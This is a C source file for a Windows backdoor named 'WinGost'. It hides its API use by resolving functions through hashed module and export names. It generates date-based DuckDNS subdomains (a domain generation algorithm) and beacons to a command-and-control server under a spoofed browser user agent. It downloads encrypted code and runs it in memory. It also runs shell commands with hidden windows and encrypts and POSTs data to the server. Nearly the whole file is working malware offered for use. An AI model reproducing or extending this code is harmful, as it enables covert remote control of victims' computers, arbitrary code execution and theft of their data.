#include "..\includes\WinGost.h"


char namesoffunc[20];

typedef struct {
    LPVOID writeableMemory;
    LPVOID entryPoint;
    FUNCTION_TABLE* ft;
} ThreadParams, *PThreadParams;


// External function provided
extern void* chacha20_Full(void* message, void* buffer, uint64_t length);
extern int derectSleep(BOOL Alertable, int DelayInterval); //DelayInterval take seconds , Alertable = FALSE

void ___chkstk_ms(void){
    return;
}

void __imp_VirtualProtect(){return;}

int custom_memcmp(const char *buf1, const char *buf2, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (buf1[i] != buf2[i]) {
            return -1;
        }
    }
    return 0;
}

void custom_memcpy(void *dest, const void *src, size_t len) {
    unsigned char *d = dest;
    const unsigned char *s = src;
    for (size_t i = 0; i < len; i++) {
        d[i] = s[i];
    }
}

void* custom_memset(void* dest, int value, size_t count) {
    unsigned char* ptr = (unsigned char*)dest;
    unsigned char byte_value = (unsigned char)value;
    
    for (size_t i = 0; i < count; i++) {
        ptr[i] = byte_value;
    }
    
    return dest;
}

#include <windows.h>


// Fully stealth DGA using only resolved WinAPI + your FUNCTION_TABLE
void generate_subdomains_by_date(wchar_t buffer[][32], int count, PFUNCTION_TABLE ft) {
    SYSTEMTIME st;
    ft->Kernel32.GetLocalTime(&st);

    // Seed = YYYYMMDD + secret salt
    DWORD seed = (st.wYear * 10000) + (st.wMonth * 100) + st.wDay;

    // Simple but good enough LCG instead of srand/rand
    for(int i = 0; i < count; i++) {
        seed = 1664525 * seed + 1013904223;        // constants from Numerical Recipes
        DWORD r = (seed >> 16) & 0x7FFF;

        wchar_t subdomain[12] = {0};

        for(int j = 0; j < 12; j++) {
            seed = 1664525 * seed + 1013904223;
            r = (seed >> 16) & 0x7FFF;
            r = r % 62;
            if (r < 26)
                subdomain[j] = L'A' + r;        // uppercase
            else if (r < 52)
                subdomain[j] = L'a' + (r-26);   // lowercase
            else
                subdomain[j] = L'0' + (r-52);   // digits
        }

        // Copy subdomain into buffer[i]
        custom_memcpy(buffer[i], subdomain, 24);
        custom_memcpy(buffer[i] + 12, L".duckdns.org", 24);

        // Null terminate
        buffer[i][24] = L'\0'; // total 24 chars: 12+12
    }
}
void ConvertUint64ToHex(uint64_t value, wchar_t *out)
{
    static const wchar_t hex[] = L"0123456789ABCDEF";

    // out[0] = L'0';
    // out[1] = L'x';

    // Interpret the 64-bit integer as 8 bytes
    const uint8_t *data = (const uint8_t *)&value;

    for (size_t i = 0; i < 8; ++i)
    {
        uint8_t b = data[i];  // NO REVERSAL
        out[i*2]     = hex[b >> 4];
        out[i*2 + 1] = hex[b & 0x0F];
    }

    out[16] = L'\0';  // 2 + (8 bytes × 2 chars)
}

// generate unique 64bit IDs based on current 100 ns time

uint64_t generate_unique_id(PFUNCTION_TABLE ft){

    FILETIME SystemTimeAsFileTime;
    LPFILETIME lpSystemTimeAsFileTime = &SystemTimeAsFileTime;
    ft->Kernel32.GetSystemTimePreciseAsFileTime(lpSystemTimeAsFileTime);
    uint64_t unique_id = ((uint64_t)lpSystemTimeAsFileTime->dwHighDateTime << 32) | lpSystemTimeAsFileTime->dwLowDateTime;
    ConvertUint64ToHex(unique_id, ft->userID);

    return 0;
}

uint32_t hash_module_name_wide(const wchar_t *name) {
    uint32_t r9d = 0;

    // Determine number of bytes in each wchar_t
    size_t wchar_bytes = sizeof(wchar_t);

    // Iterate over each wide character until we hit a wide null (all bytes zero)
    for (size_t wi = 0;; ++wi) {
        wchar_t wc = name[wi];

        uint8_t bytes[4]; // enough for wchar_t up to 4 bytes
        // Copy raw representation (relies on host endianness = little-endian)
        custom_memcpy(bytes, &wc, wchar_bytes);

        // For each byte of the wchar_t (in order), run the same byte-wise
        // transform as the Python code.
        for (size_t b = 0; b < wchar_bytes; ++b) {
            uint8_t al = bytes[b];

            // lowercase ASCII -> uppercase
            if (al >= 0x61 && al <= 0x7A) {
                al -= 0x20;
            }

            uint8_t bl = al;
            al = (uint8_t)((al + al) & 0xFF); // (al + al) & 0xFF
            al ^= bl;

            r9d = (uint32_t)((r9d + (uint32_t)al) & 0xFFFFFFFFu);

            uint32_t cl = (uint32_t)(bl & 0x1F); // rotate amount (5 bits)
            if (cl != 0) {
                r9d = (uint32_t)((r9d >> cl) | (r9d << (32 - cl)));
            } else {
                // cl == 0 => rotate by 0 leaves r9d unchanged
            }
            r9d &= 0xFFFFFFFFu;
        }

        // If this wide char was the null terminator, stop now (we already processed its zero bytes).
        if (wc == (wchar_t)0) break;
    }

    return r9d;
}

uint32_t hash_module_name_ascii(const char *name) {

    wchar_t wModuleName[260];
    int i = 0;
    for(; name[i] != '\0'; i++){
        wModuleName[i] = (wchar_t)name[i];
    }
    wModuleName[i] = L'\0';

    return hash_module_name_wide(wModuleName);

}


PVOID getDefultModuleBase(DWORD HashINT){
    PTEB teb;

    asm volatile("mov %%gs:0x30, %0"
                :"=r"(teb)
    );

    PLIST_ENTRY list = &teb->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = list->Flink;

    while (current != list) {
        PCUSTOM_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, CUSTOM_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if(hash_module_name_wide(entry->BaseDllName.Buffer) == HashINT){
            //wprintf(L"%ls\n", entry->BaseDllName.Buffer);
            return entry->DllBase;
        }

        current = current->Flink;
    }

}

PVOID getFunctionBase(DWORD HashINT,PVOID ModuleBase) {

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    char* moduleName = (char*)ModuleBase + exportDirectory->Name;


    DWORD* names = (DWORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfNames);
    DWORD* functions = (DWORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfNameOrdinals);
    
    
    for(DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)ModuleBase + names[i];
        if(hash_module_name_ascii(moduleName) + hash_module_name_ascii(functionName) == HashINT){
            custom_memcpy(namesoffunc, functionName, 15);
            namesoffunc[15] = '\0';

            //printf("Found function: %s\n", functionName);
            DWORD functionRVA = functions[ordinals[i]];
            return (PVOID)((BYTE*)ModuleBase + functionRVA);
        }
    }

}

DWORD WINAPI ModuleThread(LPVOID lpParameter) {
    PThreadParams params = (PThreadParams)lpParameter;
    LPVOID writeableMemory = params->writeableMemory;
    LPVOID entryPoint = params->entryPoint;
    PFUNCTION_TABLE ft = params->ft;

    void (*payload)(PFUNCTION_TABLE ft) = (void (*))entryPoint;
    payload(ft);

    ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
    ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, params);
    return 0;
    
}

void handleModuleExecution(PFUNCTION_TABLE ft, void* payload, DWORD totalSize) {
    // Allocate executable memory
    LPVOID writeableMemory = ft->Kernel32.VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (writeableMemory == NULL) {
        return;
    }


    // Decrypt the payload using ChaCha20
    chacha20_Full(payload, writeableMemory, totalSize);

    // Find entry point offset from Section Headers
    PCOFF_HEADER coffHeader = (PCOFF_HEADER)writeableMemory;
    LPVOID entryPoint = NULL;
    
    for (WORD i = 0; i < coffHeader->NumberOfSections; i++) {
        PSECTION_HEADER sectionHeader = (PSECTION_HEADER)((BYTE*)writeableMemory + sizeof(COFF_HEADER) + (i * sizeof(SECTION_HEADER)));
        if (custom_memcmp((char*)sectionHeader->Name, ".text", 5) == 0) {
            entryPoint = (LPVOID)((BYTE*)writeableMemory + sectionHeader->PointerToRawData);
            break;
        }
    }

    // Change memory protection to executable
    DWORD oldProtect;
    if (!ft->Kernel32.VirtualProtect(writeableMemory, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
        return;
    }

    PThreadParams params = (PThreadParams)ft->Ntdll.RtlAllocateHeap(ft->Kernel32.GetProcessHeap(), 0, sizeof(ThreadParams));
    params->writeableMemory = writeableMemory;
    params->entryPoint = entryPoint;
    params->ft = ft;

    // Create a thread to execute the payload
    HANDLE hThread = ft->Kernel32.CreateThread(NULL, 1024 * 1024, ModuleThread, params, 0, NULL);
    if (hThread == NULL) {
        ft->Kernel32.VirtualFree(writeableMemory, 0, MEM_RELEASE);
        ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, params);
        return;
    }

    //ft->Kernel32.WaitForSingleObject(hThread, INFINITE);
    ft->Kernel32.CloseHandle(hThread);

    return;

}

BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
    HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, domain, 80, 0);
    HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"GET", L"/?beacon=ALIVE", NULL, NULL, NULL, 0);


    if (!hSession || !hConnect || !hRequest) {
        goto cleanup;
    }

    WCHAR cookie[64];  // enough for "Cookie: " + 8 chars + CRLF + null
    WCHAR *p = cookie;
    // Step 1: copy "Cookie: "
    custom_memcpy(p, L"Cookie: ", 8 * sizeof(WCHAR));
    p += 8;
    // Step 2: copy 8-character userID
    custom_memcpy(p, ft->userID, 16 * sizeof(WCHAR));
    p += 16;
    // Step 3: append CRLF
    *p++ = L'\r';
    *p++ = L'\n';
    // Step 4: null terminate
    *p = L'\0';

    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {goto cleanup;}

    //if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
    if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {goto cleanup;}
    ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);

    BYTE buffer[4096];  // Fixed buffer
    BYTE* buffer_ptr = buffer;
    DWORD dwSize = 0;
    DWORD totalBytesRead = 0;
    DWORD bytesRead;

    CUSTOM_ZeroMemory(buffer, sizeof(buffer));

    do {
        ft->WinHttp.WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize == 0) break; // No more data

        if (totalBytesRead + dwSize > sizeof(buffer)) {
            // Prevent buffer overflow
            dwSize = sizeof(buffer) - totalBytesRead;
        }

        if (!ft->WinHttp.WinHttpReadData(hRequest, buffer + totalBytesRead, dwSize, &bytesRead)) {
            // Handle read error
            break;
        }

        totalBytesRead += bytesRead;
    } while (dwSize > 0 && totalBytesRead < sizeof(buffer));

    ft->WinHttp.WinHttpCloseHandle(hRequest);
    ft->WinHttp.WinHttpCloseHandle(hConnect);
    ft->WinHttp.WinHttpCloseHandle(hSession);

    // search for signature "NLSM55" in the received data
    const char *signature = "NSLM55IM";
    BOOL found = FALSE;
    for(int i = 0; i <= totalBytesRead; i++){
        if(custom_memcmp((char*)(buffer + i), signature, 8) == 0){
            found = TRUE;
            buffer_ptr = buffer + i + 8; // move pointer past the signature
            break;
        }
    }

    if(!found){
        return TRUE;
    }

    // handle module execution
    handleModuleExecution(ft, buffer_ptr, totalBytesRead - (DWORD)(buffer_ptr - buffer));

    return TRUE;

    cleanup:
        if (hRequest) ft->WinHttp.WinHttpCloseHandle(hRequest);
        if (hConnect) ft->WinHttp.WinHttpCloseHandle(hConnect);
        if (hSession) ft->WinHttp.WinHttpCloseHandle(hSession);
        return FALSE;
}

// WinGost API List

// Gost Send function: encrypts message and sends to C2 server
void gostSend(char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft){
    if (!apiID) apiID = L"0"; // "WRITE:PNG:" "DATAS:"  // set default manually

    // Encrypt message using ChaCha20
    chacha20_Full(message, message, message_len);

    // Send encrypted message to C2 server Using WinHTTP POST request
    HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, ft->domain, 80, 0);
    HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"POST", apiID, NULL, NULL, NULL, 0);

    if (!hSession || !hConnect || !hRequest) {return;}

    WCHAR cookie[64];  // enough for "Cookie: " + 8 chars + CRLF + null
    WCHAR *p = cookie;
    // Step 1: copy "Cookie: "
    custom_memcpy(p, L"Cookie: ", 8 * sizeof(WCHAR));
    p += 8;
    // Step 2: copy 8-character userID
    custom_memcpy(p, ft->userID, 16 * sizeof(WCHAR));
    p += 16;
    // Step 3: append CRLF
    *p++ = L'\r';
    *p++ = L'\n';
    // Step 4: null terminate
    *p = L'\0';

    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return;}
    if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, message, message_len, message_len, 0)) {return;}

    ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);

    ft->WinHttp.WinHttpCloseHandle(hRequest);
    ft->WinHttp.WinHttpCloseHandle(hConnect);
    ft->WinHttp.WinHttpCloseHandle(hSession);

    return;

}

// gost Print function: prints message to C2 console, with optional formatting
void gostPrint(char* message, BOOL format, int message_len, PFUNCTION_TABLE ft) {
    return;
    // if(!format){
    //     gostSend(message, message_len, L"0", ft);
    //     return;
    // }

    // char* buffer = WriteHex((const uint8_t*)message, message_len, ft);
    // gostSend(buffer, message_len * 2 + 2, L"0", ft);

    // ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, buffer);

}

// gost Execute function: fetches and executes module from C2 server
BOOL gostExecute(char* command, char* output, DWORD* outputSize, PFUNCTION_TABLE ft) {
    //char psCommand[1024];
    //snprintf(psCommand, sizeof(psCommand), "powershell -Command \"%s\"", command);

    
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    
    HANDLE hStdoutRd, hStdoutWr;
    if (!ft->Kernel32.CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        return FALSE;
    }
    
    ft->Kernel32.SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);
    
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    CUSTOM_ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    
    CUSTOM_ZeroMemory(&pi, sizeof(pi));
    
    BOOL success = ft->Kernel32.CreateProcessA(
        NULL,
        command,
        NULL,
        NULL,
        TRUE,           // Inherit handles
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    
    if (!success) {
        ft->Kernel32.CloseHandle(hStdoutRd);
        ft->Kernel32.CloseHandle(hStdoutWr);
        return FALSE;
    }
    
    ft->Kernel32.CloseHandle(hStdoutWr);
    
    // Read output
    DWORD bytesRead;
    CHAR buffer[4096];
    DWORD totalBytes = 0;
    
    while (ft->Kernel32.ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytes + bytesRead < *outputSize) {
            custom_memcpy(output + totalBytes, buffer, bytesRead);
            totalBytes += bytesRead;
        }
    }
    
    output[totalBytes] = '\0';

    //ft->Kernel32.WaitForSingleObject(pi.hProcess, INFINITE);
    
    ft->Kernel32.CloseHandle(pi.hProcess);
    ft->Kernel32.CloseHandle(pi.hThread);
    ft->Kernel32.CloseHandle(hStdoutRd);

    *outputSize = totalBytes;
    return TRUE;
}


__declspec(dllexport) void __main(void) {

    derectSleep(FALSE,300);


    // Initialize function table
    FUNCTION_TABLE functionTable;

    // setup KERNEL32 functions
    PVOID kernel32Base = getDefultModuleBase(0xA690026B); // hash of "KERNEL32.DLL"
    functionTable.Kernel32.LoadLibraryA = getFunctionBase(0xA70F2B3C, kernel32Base); // hash of "KERNEL32.DLL" + "LoadLibraryA"
    functionTable.Kernel32.GetProcAddress = getFunctionBase(0xA499C9CE, kernel32Base); // hash of "KERNEL32.DLL" + "GetProcAddress"
    functionTable.Kernel32.GetStdHandle = getFunctionBase(0x7D9EDEA7, kernel32Base); // hash of "KERNEL32.DLL" + "GetStdHandle"
    functionTable.Kernel32.WriteConsoleA = getFunctionBase(0x612CF8DF, kernel32Base); // hash of "KERNEL32.DLL" + "WriteConsoleA"
    functionTable.Kernel32.ExitProcess = getFunctionBase(0x99BD2006, kernel32Base); // hash of "KERNEL32.DLL" + "ExitProcess"
    functionTable.Kernel32.CreateThread = getFunctionBase(0xBA517264, kernel32Base); // hash of "KERNEL32.DLL" + "CreateThread"
    functionTable.Kernel32.WaitForSingleObject = getFunctionBase(0xBA517264, kernel32Base); // hash of "KERNEL32.DLL" + "WaitForSingleObject"
    functionTable.Kernel32.CloseHandle = getFunctionBase(0x2D020480, kernel32Base); // hash of "KERNEL32.DLL" + "CloseHandle"
    functionTable.Kernel32.VirtualProtect = getFunctionBase(0x06FD1396, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualProtect"
    functionTable.Kernel32.VirtualAlloc = getFunctionBase(0x9C7BFF01, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualAlloc"
    functionTable.Kernel32.VirtualFree = getFunctionBase(0x81C26E14, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualFree"
    functionTable.Kernel32.GetProcessHeap = getFunctionBase(0x7460A5C2, kernel32Base); // hash of "KERNEL32.DLL" + "ProcessHeap"
    //functionTable.Kernel32.Sleep = getFunctionBase(0xF78728AE, kernel32Base); // hash of "KERNEL32.DLL" + "Sleep"
    functionTable.Kernel32.CreateProcessA = getFunctionBase(0x98975766, kernel32Base); // hash of "KERNEL32.DLL" + "CreateProcessA"

    functionTable.Kernel32.CreatePipe = getFunctionBase(0x23E967FD, kernel32Base); // hash of "KERNEL32.DLL" + "CreatePipe"
    functionTable.Kernel32.SetHandleInformation = getFunctionBase(0x80A469C3, kernel32Base); // hash of "KERNEL32.DLL" + "SetHandleInformation"
    functionTable.Kernel32.ReadFile = getFunctionBase(0x2ABA496E, kernel32Base); // hash of "KERNEL32.DLL" + "ReadFile"
    functionTable.Kernel32.CreateFileA = getFunctionBase(0x9F091EC6, kernel32Base); // hash of "KERNEL32.DLL" + "CreateFileA"
    functionTable.Kernel32.GetFileSize = getFunctionBase(0x08DC1E1D, kernel32Base); // hash of "KERNEL32.DLL" + "GetFileSize"

    functionTable.Kernel32.GetLocalTime = getFunctionBase(0x280C4D4B, kernel32Base); // hash of "KERNEL32.DLL" + "GetLocalTime"

    functionTable.Kernel32.GetSystemTimePreciseAsFileTime = getFunctionBase(0xF064B8AA, kernel32Base); // hash of "KERNEL32.DLL" + "GetSystemTimePreciseAsFileTime"


    // functionTable.Kernel32.HeapAlloc = getFunctionBase(0x8024706B, kernel32Base); // hash of "KERNEL32.DLL" + "HeapAlloc"
    // functionTable.Kernel32.HeapFree = getFunctionBase(0xD2A541DC, kernel32Base); // hash of "KERNEL32.DLL" + "HeapFree"

    // setup NTDLL functions
    PVOID ntdllBase = getDefultModuleBase(0x2BC46FF9); // hash of "NTDLL.DLL"
    functionTable.Ntdll.RtlAllocateHeap = getFunctionBase(0x230F037F, ntdllBase); // hash of "NTDLL.DLL" + "RtlAllocateHeap"
    functionTable.Ntdll.RtlFreeHeap = getFunctionBase(0xE996EEB9, ntdllBase); // hash of "NTDLL.DLL" + "RtlFreeHeap"
    
    // setup WINHTTP functions
    PVOID winhttpBase = functionTable.Kernel32.LoadLibraryA("winhttp.dll");
    functionTable.WinHttp.WinHttpOpen = getFunctionBase(0x9402FA91, winhttpBase); // hash of "winhttp.dll" + "WinHttpOpen"
    functionTable.WinHttp.WinHttpConnect = getFunctionBase(0xA577190A, winhttpBase); // hash of "winhttp.dll" + "WinHttpConnect"
    functionTable.WinHttp.WinHttpOpenRequest = getFunctionBase(0xE8C92EF7, winhttpBase); // hash of "winhttp.dll" + "WinHttpOpenRequest"
    functionTable.WinHttp.WinHttpAddRequestHeaders = getFunctionBase(0x2B418E8E, winhttpBase); // hash of "winhttp.dll" + "WinHttpAddRequestHeaders"
    functionTable.WinHttp.WinHttpSendRequest = getFunctionBase(0xB2CCBB00, winhttpBase); // hash of "winhttp.dll" + "WinHttpSendRequest"
    functionTable.WinHttp.WinHttpReceiveResponse = getFunctionBase(0x11480B6C, winhttpBase); // hash of "winhttp.dll" + "WinHttpReceiveResponse"
    functionTable.WinHttp.WinHttpQueryDataAvailable = getFunctionBase(0x86637F65, winhttpBase); // hash of "winhttp.dll" + "WinHttpQueryDataAvailable"
    functionTable.WinHttp.WinHttpReadData = getFunctionBase(0xCE8D83B0, winhttpBase); // hash of "winhttp.dll" + "WinHttpReadData"
    functionTable.WinHttp.WinHttpCloseHandle = getFunctionBase(0x5C2C973B, winhttpBase); // hash of "winhttp.dll" + "WinHttpCloseHandle"

    // setup WINGOST functions
    functionTable.WinGost.gostSend = gostSend; // assign gostSend function
    functionTable.WinGost.gostPrint = gostPrint; // assign gostPrint function
    functionTable.WinGost.gostExecute = gostExecute; // assign gostExecute function
    functionTable.WinGost.gostSleep = derectSleep; // assign derectSleep function

    // Test the resolved functions
    PFUNCTION_TABLE ft = &functionTable;

    // generate unique ID for this instance
    generate_unique_id(ft);


    wchar_t subdomains[10][32];

    generate_subdomains_by_date(subdomains, 10, ft);

    int i = 0;
    while (1)
    {
        
        derectSleep(FALSE, 15); // Sleep for 5 seconds before next beacon

        if(c2BeaconCommunicate(subdomains[i], ft)){
            ft->domain = subdomains[i];
            continue;
        }

        i++;
        if(i > 9){
            i = 0;
        }
    }
    

    ft->Kernel32.ExitProcess(0);
}